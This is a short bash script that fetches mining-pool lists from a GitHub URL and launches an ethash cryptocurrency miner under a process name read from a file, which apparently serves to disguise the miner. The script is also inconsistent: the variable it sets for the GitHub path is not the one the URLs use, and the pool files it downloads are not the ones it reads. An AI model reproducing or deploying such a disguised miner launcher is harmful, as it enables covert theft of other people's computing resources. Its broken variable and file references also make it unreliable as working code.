#!/bin/bash

rm -rf pool1.txt pool2.txt
gitpathbin=$(cat ../gitpath.txt)
wget https://raw.githubusercontent.com/$gitpath/main/pool1.txt
wget https://raw.githubusercontent.com/$gitpath/main/pool2.txt

Uuname=$(cat inuser.txt)
date=$(cat date.txt)
USEPROCNAME=$(cat SETPROCNAME.txt)
namenday="$Uuname"-"$date"
pool1=$(cat wpool1.txt)
pool2=$(cat wpool2.txt)
./$USEPROCNAME -a ethash -o stratum+http://$pool1 -o stratum+http://$pool2 -w $namenday
